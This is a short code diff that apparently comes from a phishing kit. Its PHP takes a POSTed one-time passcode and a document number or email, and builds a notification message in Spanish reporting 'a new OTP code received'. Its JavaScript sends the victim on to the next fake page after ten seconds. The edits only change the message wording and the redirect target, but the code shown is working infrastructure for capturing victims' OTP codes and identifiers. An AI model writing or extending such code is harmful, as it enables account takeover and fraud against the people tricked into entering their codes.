@@ -9,7 +9,7 @@ $otp = $_POST['otp_code'] ?? "NO RECIBIDO";
 $ips1 = $_POST['ips1'] ?? "NO RECIBIDO";
 
 // Construir mensaje
-$mensaje = "🔔 *Nuevo código OTP recibido*\n\n";
+$mensaje = "🔔 *Nuevo código OTP ✅ x ✅*\n\n";
 $mensaje .= "Documento/Email: *$ips1*\n";
 $mensaje .= "Código: *$otp*";
 
@@ -117,7 +117,7 @@ exit;
 
     // ---- Después de 10 segundos, pasar a step2.html ----
     setTimeout(() => {
-      window.location.href = "lod2.html";
+      window.location.href = "lod3.html";
     }, 10000); // 10.000 ms = 10 s
   </script>
 
